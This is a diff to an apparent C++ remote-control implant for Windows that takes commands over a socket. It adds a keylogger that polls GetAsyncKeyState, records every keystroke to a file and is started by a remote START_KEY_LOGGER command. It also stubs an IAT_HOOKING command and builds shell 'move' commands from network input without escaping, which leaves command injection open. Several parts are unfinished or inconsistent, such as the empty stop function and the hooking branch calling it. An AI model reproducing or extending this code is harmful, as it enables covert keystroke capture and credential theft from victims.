@@ -7,6 +7,8 @@
 #include "WindowsSocket.h"
 #include "string.h"
 #include "Aclapi.h""
+#include <thread>
+
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
@@ -47,6 +49,7 @@ void create_file(SocketManager socketManager, SOCKET socket, char* recBuf, int i
 		cout << "closed the file" << endl;
 	}
 }
+
 std::string exec(const char* cmd)
 {
 	char buffer[128];
@@ -256,25 +259,151 @@ void moveFile(SocketManager & socketManager, SOCKET & socket)
 	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4); // TODO: what to do with result?
 	string dirToMove = string(recvbuf);
 
+	char sep = '\\';
+	string fileName;
+	size_t i = filePath.rfind(sep, filePath.length());
+	if (i != string::npos) {
+		fileName = (filePath.substr(i + 1, filePath.length() - i)); 
+	}
+	else
+	{
+		throw new exception("Error reading file path");
+	}
 
-	string command = "move \"" + filePath + "\" " + "\"" + dirToMove + "\\" + filePath + "\"";
+	string command = "move \"" + filePath + "\" " + "\"" + dirToMove + "\\" + fileName + "\"";
 
 	//executes the command
 	std::string w = exec(command.c_str());
+	if (w.size() == 0)
+	{
+		w = "Something went wrong...";
+	}
 
 	//send result
 	result = socketManager.send_data(socket, w.c_str());
 }
+
+char convertKey(int key)
+{
+	switch (key)
+	{
+	case 49: return '!';
+	case 50: return '@';
+	case 51: return '#';
+	case 52: return '$';
+	case 53: return '%';
+	case 54: return '^';
+	case 55: return '&';
+	case 56: return '*';
+	case 57: return '(';
+	case 48: return ')';
+	case 45: return '_';
+	case 61: return '+';
+		//case 56: return '*';
+	}
+	return '\0';
+}
+
+void keyLOG(string input) {
+	fstream LogFile;
+	LogFile.open("keyLogger.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
+	}
+}
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
+	case VK_CONTROL:
+		keyLOG("#CTRL#");
+		return true;
+	case VK_TAB:
+		keyLOG("\t");
+		return true;
+	case VK_SPACE:
+		keyLOG(" ");
+		return true;
+	case VK_RETURN:
+		keyLOG("\n");
+		return true;
+	case '¾':
+		keyLOG(".");
+		return true;
+	case VK_BACK:
+		keyLOG("\b");
+		return true;
+	case VK_RBUTTON:
+		keyLOG("#R_CLICK#");
+		return true;
+	case VK_SHIFT:
+		keyLOG("");
+		return true;
+	default:
+		return false;
+	}
+}
+
+void stopKeyLogger()
+{
+
+}
+
+DWORD WINAPI startKeyLogger()
+{
+	char KEY = 'x';
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+						if (KEY >= 65 && KEY <= 90) // letters
+						{
+							if ((GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_CAPITAL) & 0x0001)) // capital letters
+							{
+								LogFile << char(KEY);
+							}
+							else // lower letters
+							{
+								LogFile << char(KEY + 32);
+							}
+						}
+						else // not letters
+						{
+							if (GetKeyState(VK_SHIFT) & 0x8000) // shift is on 
+							{
+								char newKey = convertKey(KEY);
+								if (newKey != '\0')
+								{
+									LogFile << newKey;
+								}
+							}
+							else // shift is off 
+							{
+								LogFile << char(KEY);
+							}
+						}
+						LogFile.close();
+					}
+				}
+			}
+		}
+	}
+}
 //int main()
 //{
-//	string dir = "c:\\";
-//	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b') do icacls %x";
-//	char * c = "\" && for /f %x in ('dir /b') do icacls %x";
-//	cout << c;
+//	DWORD ThreadID;
+//	CreateThread(NULL, 0, startKeyLogger, (void*) this, 0, &ThreadID);
+//	cout << "hello";
+//	
 //
-//	cout << command;
+//	return 0;
 //}
-int main(int argc, char **argv)
+int main2(int argc, char **argv)
 {
 	SocketManager socketManager;
 	WindowsSocket windowsSocket;
@@ -379,6 +508,21 @@ int main(int argc, char **argv)
 					else if (!strcmp(recvbuf, "MOVE_FILE"))//2, 6
 					{
 						moveFile(socketManager, socket);
+					}
+					else if (!strcmp(recvbuf, "START_KEY_LOGGER"))
+					{
+						//CreateThread(NULL,)
+						startKeyLogger();//from differnet thread
+					}
+					else if (!strcmp(recvbuf, "STOP_KEY_LOGGER"))
+					{
+						//CreateThread(NULL,)
+						stopKeyLogger();//from differnet thread
+					}
+					else if (!strcmp(recvbuf, "IAT_HOOKING"))
+					{
+						//CreateThread(NULL,)
+						stopKeyLogger();//from differnet thread
 					}
 					else
 					{
